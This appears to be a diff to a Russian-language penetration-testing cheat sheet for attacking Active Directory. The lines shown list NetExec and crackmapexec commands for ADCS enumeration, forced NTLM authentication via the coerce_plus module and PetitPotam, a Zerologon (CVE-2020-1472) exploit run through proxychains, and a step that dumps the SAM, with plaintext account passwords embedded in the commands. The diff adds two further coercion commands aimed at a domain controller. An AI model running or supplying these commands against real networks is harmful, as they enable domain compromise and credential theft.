@@ -92,7 +92,7 @@
    		(поиск центра сертификации)	crackmapexec ldap 'dc.sequel.htb' -d 'sequel.htb' -u 'Ryan.Cooper' -p 'NuclearMosquito3' -M adcs  	
   		
 		(Уязвимые для атак перенаправления серверы )	nxc smb 10.10.1.50 -u kemг -p password -M coersce_plus		
-		
+								proxychains nxc smb DC01 -u svc_sql -p 'jkhnrjk123!' -M coerce_plus -o LISTENER=srv01 ALWAYS=TRUE
 		nxc smb dc1.corp.com -u '' -p '' -M zerologon	(git clone https://github.com/dirkjanm/CVE-2020-1472 -q)
 
 			---proxychains4 -q python3 cve-2020-1472-exploit.py dc01 172.16.10.3 
@@ -1097,6 +1097,8 @@
 	4. Принудительное выполнение команд на рабочей станции с помощью NetExec или PetitPotam
 	Теперь мы используем NetExec or PetitPotam для принудительного выполнения на хосте-жертве исходящей аутентификации NTLM с использованием нашего поддельного DNS-имени:
 	nxc smb <target-ip> -u scarter -p Passw0rd -M coerce_plus -o METHOD=PetitPotam LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
+	proxychains nxc smb DC01 -u svc_sql -p 'jkhnrjk123!' -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ALWAYS=TRUE
+	
 	5. Сброс SAM после аутентификации SYSTEM
 	После успешного принудительного применения (аутентификации) мы извлекаем токен SYSTEM и сбрасываем SAM
 	в окне
